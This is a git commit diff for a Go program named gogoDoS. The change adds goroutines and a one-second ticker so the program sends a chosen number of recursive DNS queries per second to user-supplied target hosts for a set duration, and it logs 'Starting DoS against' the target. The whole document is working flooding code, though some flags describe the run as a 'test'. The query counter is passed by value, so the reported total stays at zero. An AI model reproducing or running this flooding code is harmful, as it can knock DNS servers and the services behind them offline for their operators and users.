2bcd3460f97400149dba51fcf4b8ae31763cb9f4
Rob Cameron <rwcameron@gmail.com>
2014-03-20 19:11:00 -0700

    worked on timing

--- src/gogoDoS.go
+++ src/gogoDoS.go
@@ -6,8 +6,12 @@ import (
     "log"
     "flag"
     "net"
-//    "time"
+    "time"
+    "runtime"
+    "sync"
 )
+
+var wg sync.WaitGroup
 
 var protoFlag = flag.String("p","","Specify protocol to use for DoS")
 var destPort = flag.Int("P",53,"Specify destination port for DoS")
@@ -15,35 +19,58 @@ var destIPs = flag.String("d","","Specify an single host or a list of hosts sepe
 var rateFlag = flag.Int("r",1,"Specify the amount of protocol requests per second")
 var durationFlag = flag.Int("D",60,"Specify the total duration of the test")
 
+func dnsQuery(config *dns.ClientConfig, queryCounter int) {
+    defer wg.Done()
+    dnsClient := new(dns.Client)
+    message := new(dns.Msg)
+    message.SetQuestion(dns.Fqdn("cnn.com"), dns.TypeA)
+    message.RecursionDesired = true
+
+    response, _, err := dnsClient.Exchange(message, net.JoinHostPort(config.Servers[0], "53"))
+
+    if err != nil {
+        //log.Println(err)
+    }
+
+    if response == nil {
+    } else {
+        if response.Rcode != dns.RcodeSuccess {
+            log.Println(" query fail")
+        }
+        //log.Println(rtt)
+        queryCounter = queryCounter + 1
+    }
+}
+
+
 func main() {
+    runtime.GOMAXPROCS(runtime.NumCPU() * 2)
+    var runCounter int
+    runCounter = 0
+    var queryCounter int
+    queryCounter = 0
+
     flag.Parse()
     log.Printf("Starting DoS against %s on Port %d via protocol %s at rate %d/s", *destIPs, *destPort, *protoFlag, *rateFlag)
     config := new(dns.ClientConfig)
     config.Servers = strings.Split(*destIPs,":")
     config.Port = string(*destPort)
     config.Ndots = 1
-    config.Timeout = 5
+    config.Timeout = 1
     config.Attempts = 1
+    ticker := time.NewTicker(time.Second * 1)
 
-    for i := 0; i < *rateFlag; i++ {
-        dnsClient := new(dns.Client)
-        message := new(dns.Msg)
-        message.SetQuestion(dns.Fqdn("cnn.com"), dns.TypeA)
-        message.RecursionDesired = true
-
-        response, _, err := dnsClient.Exchange(message, net.JoinHostPort(config.Servers[0], "53"))
-
-        if err != nil {
-            log.Fatalln(err)
+    for t := range ticker.C {
+        runCounter = runCounter + 1
+        log.Println(t)
+        for i := 0; i < *rateFlag; i++ {
+            wg.Add(1)
+            go dnsQuery(config, queryCounter)
         }
-
-        if response == nil {
-            log.Println(" *** invalid ***")
-        } else {
-            if response.Rcode != dns.RcodeSuccess {
-                log.Println(" query fail")
-            }
-            log.Println(response.MsgHdr.Id)
+        if runCounter == *durationFlag {
+            wg.Wait()
+            log.Printf("Completed %d queries over %d runs to %s",queryCounter,runCounter ,*destIPs)
+            break
         }
     }
 
